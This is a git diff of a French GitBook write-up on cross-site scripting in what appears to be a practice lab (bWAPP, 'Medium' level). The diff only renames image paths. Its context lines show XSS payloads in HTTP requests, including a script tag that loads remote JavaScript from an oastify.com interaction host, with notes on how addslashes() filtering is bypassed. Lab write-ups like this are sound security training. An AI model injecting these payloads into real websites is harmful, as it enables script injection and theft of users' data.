@@ -71,7 +71,7 @@ Connection: close
 entry=%253c%2573%2563%2572%2569%2570%2574%253e%2561%256c%2565%2572%2574%2528%2531%2529%253c%252f%2573%2563%2572%2569%2570%2574%253e&blog=submit&entry_add=
 ```
 
-![](<../../../../../.gitbook/assets/image (14).png>)
+![](<../../../../../.gitbook/assets/image (14) (3).png>)
 
 L'injection HTML/XSS ne semble donc pas réalisable ici même au niveau "Medium".
 
@@ -262,7 +262,7 @@ function xss_check_4($data) {
 
 La méthode `addslashes()` permet d'échapper (en ajoutant un anti-slash) les caractères guillemets simples ( ' ), guillemets doubles ( " ), antislash (\\) et l'octet NUL :
 
-![](<../../../../../.gitbook/assets/image (5).png>)
+![](<../../../../../.gitbook/assets/image (5) (2).png>)
 
 L'injection de base va fonctionner sans problème :&#x20;
 
@@ -280,7 +280,7 @@ Connection: close
 entry=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&blog=submit&entry_add=
 ```
 
-![](<../../../../../.gitbook/assets/image (11) (1).png>)
+![](<../../../../../.gitbook/assets/image (11) (1) (2).png>)
 
 L'injection de script distant est plus gênant puisque les guillemets simples et doubles vont être échappés :&#x20;
 
@@ -317,6 +317,6 @@ Connection: close
 entry=%3Cscript+src%3Dhttp%3A%2F%2Fpha4dbrnyd3796rdbvttq48mfdl49t.oastify.com%3E%3C%2Fscript%3E&blog=submit&entry_add=
 ```
 
-![](<../../../../../.gitbook/assets/image (4).png>)
+![](<../../../../../.gitbook/assets/image (4) (2).png>)
 
-![](<../../../../../.gitbook/assets/image (17).png>)
+![](<../../../../../.gitbook/assets/image (17) (3).png>)
